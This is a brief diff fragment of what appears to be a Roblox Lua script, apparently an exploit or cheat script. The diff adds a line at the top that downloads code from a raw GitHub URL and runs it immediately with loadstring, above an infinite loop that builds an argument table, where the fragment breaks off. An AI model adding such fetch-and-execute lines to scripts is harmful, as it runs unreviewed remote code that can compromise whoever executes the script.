@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0punch", true))()
+
+
+
 while true do
 wait()
 local args = {
